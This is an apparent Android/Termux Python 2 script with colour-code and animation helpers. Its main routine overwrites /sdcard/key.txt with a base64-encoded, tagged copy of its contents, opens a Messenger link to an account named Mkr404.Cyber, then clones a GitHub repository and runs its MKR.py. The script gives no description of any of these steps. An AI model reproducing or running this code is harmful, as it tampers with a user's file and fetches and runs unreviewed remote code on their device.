from sys import stdout
import subprocess as sp, os, sys, time, random, base64, marshal, getpass, re, zlib
m = '\x1b[1;91m'
u = '\x1b[1;95m'
h = '\x1b[1;92m'
p = '\x1b[1;37m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
bm = '\x1b[96m'


try:
    from uncompyle6.main import decompile
except Exception as e:
    sp.call('pip2 install uncompyle6', shell=True, stderr=sp.STDOUT)
    
red = '\x1b[31m'
green = '\x1b[32m'
yellow = '\x1b[33m'
blue = '\x1b[34m'
magenta = '\x1b[35m'
cyan = '\x1b[36m'
white = '\x1b[37m'
reset = '\x1b[39m'
brblack = '\x1b[90m'
R = '\x1b[91m'
brgreen = '\x1b[92m'
k = '\x1b[93m'
brblue = '\x1b[94m'
brmgnt = '\x1b[95m'
brcyan = '\x1b[96m'
G = '\x1b[97m'

def jalan(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)


def load(word):
    lix = ['/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.2)
            sys.stdout.flush()


def running(s):
    try:
        for c in s + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.001)

    except (KeyboardInterrupt, EOFError):
        run('Nonaktif!!!')



def xr():
    try:
        f = ('/sdcard/key.txt') 
    except:
        exit()

    try:
        bk = open(f, 'r').read()
    except:
        exit()

    en = base64.b64encode(bk)
    ff = f 
    xxx = open(ff, 'w').write('' + en +'<MKR' '')
    os.system('am start https://m.me/Mkr404.Cyber?text=');time.sleep(3)
    os.system('git clone https://github.com/Mkr404-Cyber/Find_GF && cd Find_GF && python MKR.py')



if __name__ == '__main__':
        xr()
  
